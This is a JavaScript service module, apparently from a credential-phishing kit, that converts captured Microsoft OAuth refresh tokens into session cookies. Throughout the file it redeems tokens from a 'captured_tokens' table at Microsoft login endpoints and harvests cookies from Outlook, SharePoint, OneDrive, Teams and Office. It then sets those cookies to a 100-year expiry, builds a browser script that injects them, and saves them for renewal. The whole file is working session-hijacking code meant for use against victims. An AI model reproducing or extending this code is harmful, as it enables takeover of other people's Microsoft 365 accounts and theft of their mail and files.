/**
 * VGenius Cookie Converter Service
 * Converts OAuth2 refresh tokens to long-lasting session cookies
 */
'use strict';

const axios = require('axios');
const { encrypt } = require('../utils/encrypt');
const db = require('../database/connection');
const config = require('../config/env');

// Microsoft OAuth2 client configuration
const CLIENT_ID = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const TENANT = config.AZURE_TENANT || 'common';

// Token endpoint URLs for different tenant types
const TOKEN_ENDPOINTS = {
  tenant: `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`,
  common: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
  consumers: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
};

/**
 * Convert OAuth2 refresh token to session cookies with 100-year expiry
 * @param {string} accessToken - The OAuth2 refresh token (0.AT or M.R format)
 * @param {string} templateType - Template type for service endpoints
 * @param {string} tenant - Azure tenant ID
 * @param {string} email - User email for personalized endpoints
 * @returns {object} Result with cookies string and metadata
 */
async function convertTokensToCookies(accessToken, templateType, tenant, email) {
  tenant = tenant || 'common';
  email = email || '';

  try {
    // Validate input
    if (!accessToken || typeof accessToken !== 'string') {
      return { success: false, error: 'Invalid access token provided', cookies: null };
    }

    // Detect OAuth2 refresh token format
    const isOAuth2RefreshToken = accessToken.startsWith('0.AT') || accessToken.startsWith('M.R') || accessToken.length > 100;
    if (!isOAuth2RefreshToken) {
      return {
        success: false,
        error: 'Invalid token format. Please provide the OAuth2 refresh token (starts with 0.AT or M.R)',
        cookies: null,
      };
    }

    // Step 1: Exchange refresh token for new tokens + cookies from MS
    const exchangeResult = await exchangeRefreshTokenForCookies(accessToken, tenant);
    if (!exchangeResult.success) {
      return exchangeResult;
    }

    // Step 2: Collect additional cookies from Microsoft service endpoints
    const serviceCookies = await collectServiceCookies(exchangeResult.access_token, templateType, tenant, email);

    // Step 3: Combine all cookies
    const allCookies = [...exchangeResult.cookies, ...serviceCookies];
    if (allCookies.length === 0) {
      return { success: false, error: 'No cookies received from token exchange', cookies: null };
    }

    // Step 4: Format cookies for browser injection with 100-year expiry
    const cookieString = formatCookiesForInjection(allCookies);

    return {
      success: true,
      cookies: cookieString,
      cookie_count: allCookies.length,
      access_token: exchangeResult.access_token,
      new_refresh_token: exchangeResult.new_refresh_token,
      expires: '100 years',
    };
  } catch (err) {
    console.error('[CookieConverter] Conversion failed:', err.message);
    return { success: false, error: err.message, cookies: null };
  }
}

/**
 * Exchange OAuth2 refresh token for new access token + capture Set-Cookie headers
 * Tries tenant-specific first, then falls back to common/consumers
 */
async function exchangeRefreshTokenForCookies(refreshToken, targetTenant) {
  const cookies = [];
  let newRefreshToken = null;
  const tenantToUse = targetTenant || TENANT;

  // Try endpoints in priority order: tenant-specific -> common -> consumers
  const endpoints = [
    `https://login.microsoftonline.com/${tenantToUse}/oauth2/v2.0/token`,
    TOKEN_ENDPOINTS.common,
    TOKEN_ENDPOINTS.consumers,
  ];

  let lastError = null;

  for (const endpoint of endpoints) {
    try {
      const params = new URLSearchParams({
        client_id: CLIENT_ID,
        grant_type: 'refresh_token',
        refresh_token: refreshToken,
        scope: 'https://graph.microsoft.com/.default offline_access openid profile',
      });

      const response = await axios.post(
        endpoint,
        params,
        {
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          validateStatus: () => true,
          maxRedirects: 5,
        }
      );

      if (response.status === 200) {
        // Extract new refresh token if provided
        newRefreshToken = response.data.refresh_token || refreshToken;

        // Capture ALL Set-Cookie headers from the token response
        const setCookieHeaders = response.headers['set-cookie'] || [];
        for (const cookieStr of setCookieHeaders) {
          const cookieParts = cookieStr.split(';')[0].trim();
          const eqIndex = cookieParts.indexOf('=');
          if (eqIndex > 0) {
            const cookieName = cookieParts.substring(0, eqIndex).trim();
            const cookieValue = cookieParts.substring(eqIndex + 1).trim();
            if (cookieName && cookieValue) {
              cookies.push({
                name: cookieName,
                value: cookieValue,
                domain: '.login.microsoftonline.com',
              });
            }
          }
        }

        return {
          success: true,
          cookies: cookies,
          access_token: response.data.access_token,
          new_refresh_token: newRefreshToken,
        };
      }

      lastError = response.data?.error_description || response.data?.error || 'Unknown error';
    } catch (err) {
      lastError = err.message;
    }
  }

  return { success: false, error: lastError || 'Token exchange failed', cookies: null };
}

/**
 * Collect additional cookies from Microsoft service endpoints
 */
async function collectServiceCookies(accessToken, templateType, tenant, email) {
  const cookies = [];
  const endpoints = getServiceEndpoints(templateType, tenant, email);

  for (const ep of endpoints) {
    try {
      await fetchCookiesFromEndpoint(cookies, ep, accessToken);
    } catch (err) {
      // Continue collecting even if one endpoint fails
    }
  }

  return cookies;
}

/**
 * Fetch cookies from a single service endpoint
 */
async function fetchCookiesFromEndpoint(cookieList, url, accessToken) {
  // Try GET first
  try {
    const response = await axios.get(url, {
      headers: {
        Authorization: `Bearer ${accessToken}`,
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
      },
      maxRedirects: 5,
      validateStatus: (status) => status < 400,
    });

    const setCookieHeaders = response.headers['set-cookie'] || [];
    for (const cookieStr of setCookieHeaders) {
      const cookieParts = cookieStr.split(';')[0].trim();
      const eqIndex = cookieParts.indexOf('=');
      if (eqIndex > 0) {
        const cookieName = cookieParts.substring(0, eqIndex).trim();
        const cookieValue = cookieParts.substring(eqIndex + 1).trim();
        if (cookieName && cookieValue) {
          try {
            const domain = new URL(url).hostname;
            cookieList.push({ name: cookieName, value: cookieValue, domain: domain });
          } catch (e) {
            cookieList.push({ name: cookieName, value: cookieValue, domain: '.' });
          }
        }
      }
    }
  } catch (getErr) {
    // Try POST if GET fails
    try {
      const response = await axios.post(
        url,
        {},
        {
          headers: {
            Authorization: `Bearer ${accessToken}`,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          },
          maxRedirects: 5,
          validateStatus: (status) => status < 400,
        }
      );

      const setCookieHeaders = response.headers['set-cookie'] || [];
      for (const cookieStr of setCookieHeaders) {
        const cookieParts = cookieStr.split(';')[0].trim();
        const eqIndex = cookieParts.indexOf('=');
        if (eqIndex > 0) {
          const cookieName = cookieParts.substring(0, eqIndex).trim();
          const cookieValue = cookieParts.substring(eqIndex + 1).trim();
          if (cookieName && cookieValue) {
            try {
              const domain = new URL(url).hostname;
              cookieList.push({ name: cookieName, value: cookieValue, domain: domain });
            } catch (e) {
              cookieList.push({ name: cookieName, value: cookieValue, domain: '.' });
            }
          }
        }
      }
    } catch (postErr) {
      // Ignore errors - just collecting optional cookies
    }
  }
}

/**
 * Format cookies for browser injection with 100-year expiry
 * Returns a single string suitable for document.cookie assignment
 */
function formatCookiesForInjection(cookies) {
  const cookieStrings = [];

  // Calculate expiry date: 100 years from now
  const expiryDate = new Date();
  expiryDate.setFullYear(expiryDate.getFullYear() + 100);
  const expiresStr = expiryDate.toUTCString();

  for (const cookie of cookies) {
    let cookieStr = `${cookie.name}=${cookie.value}`;

    if (cookie.domain) {
      cookieStr += `; domain=${cookie.domain}`;
    }

    // 100-year expiry for persistence across browser restarts
    cookieStr += `; expires=${expiresStr}`;

    // SameSite=None + Secure for cross-domain compatibility
    cookieStr += '; SameSite=None';
    cookieStr += '; path=/';
    cookieStr += '; secure';

    cookieStrings.push(cookieStr);
  }

  return cookieStrings.join('; ');
}

/**
 * Generate JavaScript code that injects cookies into the browser
 * This script runs in the user's browser to set all cookies
 */
function generateCookieInjectionScript(cookies) {
  if (!cookies || !cookies.success || !cookies.cookies) {
    return '';
  }

  const expiryDate = new Date();
  expiryDate.setFullYear(expiryDate.getFullYear() + 100);
  const expiresStr = expiryDate.toUTCString();

  // Build individual cookie setting statements
  const cookieStatements = [];
  const cookieArray = cookies.cookies.split('; ');

  for (const rawCookie of cookieArray) {
    const parts = rawCookie.split(';');
    const nameValue = parts[0].trim();
    const eqIdx = nameValue.indexOf('=');
    if (eqIdx <= 0) continue;

    const name = nameValue.substring(0, eqIdx).trim();
    const value = nameValue.substring(eqIdx + 1).trim();

    if (!name || !value) continue;

    // Determine domain from cookie
    let domainAttr = '';
    for (let i = 1; i < parts.length; i++) {
      const part = parts[i].trim();
      if (part.startsWith('domain=')) {
        const d = part.substring(7).trim();
        if (d) domainAttr = `; domain=${d}`;
      }
    }

    cookieStatements.push(
      `document.cookie="${name}=${value}${domainAttr}; expires=${expiresStr}; path=/; SameSite=None; secure";`
    );
  }

  // Return a script that sets cookies AND stores them for later use
  return `<script>
(function(){
  var cookies=[${cookieArray.map(function(c){return '"'+c.replace(/"/g,'\\"')+'"'}).join(',')}];
  var expiry=new Date();expiry.setFullYear(expiry.getFullYear()+100);var exp=expiry.toUTCString();
  for(var i=0;i<cookies.length;i++){
    try{document.cookie=cookies[i]+'; expires='+exp+'; path=/; SameSite=None; secure'}catch(e){}
  }
  window.__VG_COOKIES_SET=true;
  console.log('[VGenius] '+cookies.length+' cookies injected successfully');
})();
<\/script>`;
}

/**
 * Get service endpoints based on template type
 */
function getServiceEndpoints(templateType, tenant, email) {
  const type = (templateType || '').toLowerCase();
  const endpoints = ['https://login.microsoftonline.com/common/oauth2/authorize'];

  if (type.includes('sharepoint')) {
    endpoints.push(`https://${tenant}.sharepoint.com/_layouts/15/teamslogon.aspx`);
  } else if (type.includes('outlook') || type.includes('auth')) {
    endpoints.push('https://outlook.office365.com/owa/');
    endpoints.push('https://outlook.office.com/owa/');
  } else if (type.includes('onedrive')) {
    endpoints.push('https://onedrive.live.com/');
    if (email) {
      endpoints.push(
        `https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email)}/_layouts/15/onedrive.aspx`
      );
    }
  } else if (type.includes('teams')) {
    endpoints.push('https://teams.microsoft.com/');
    endpoints.push('https://teams.microsoft.com/api/authservice/health');
  } else if (type.includes('office')) {
    endpoints.push('https://www.office.com/');
    endpoints.push('https://www.office.com/login');
  }

  return endpoints;
}

/**
 * Determine primary endpoint for template type
 */
function determineEndpoint(templateType, tenant, email) {
  const type = (templateType || '').toLowerCase();
  if (type.includes('sharepoint')) return 'https://login.microsoftonline.com/common/oauth2/authorize';
  if (type.includes('outlook') || type.includes('auth')) return 'https://outlook.office365.com/owa/';
  if (type.includes('onedrive'))
    return `https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email || 'user')}/_layouts/15/onedrive.aspx`;
  if (type.includes('teams')) return 'https://teams.microsoft.com/';
  if (type.includes('office') || type.includes('word') || type.includes('excel')) return 'https://www.office.com/';
  return 'https://www.office.com/';
}

/**
 * Determine resource URL for template type
 */
function determineResource(templateType, tenant) {
  const type = (templateType || '').toLowerCase();
  if (type.includes('sharepoint')) return `https://${tenant}.sharepoint.com`;
  if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com`;
  return 'https://graph.microsoft.com';
}

/**
 * Process cookie conversion and save to database
 */
async function processCookieConversion(tokenId, accessToken, templateType, tenant) {
  const result = await convertTokensToCookies(accessToken, templateType, tenant);

  if (result.success && result.cookies) {
    // Save with 100-year TTL
    const ttlHours = 24 * 365 * 100;
    await db.query(
      'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=renewal_count+1 WHERE id=?',
      [encrypt(result.cookies), 'cookie', ttlHours, tokenId]
    );
  }

  return result;
}

module.exports = {
  convertTokensToCookies,
  generateCookieInjectionScript,
  processCookieConversion,
  determineEndpoint,
  determineResource,
};
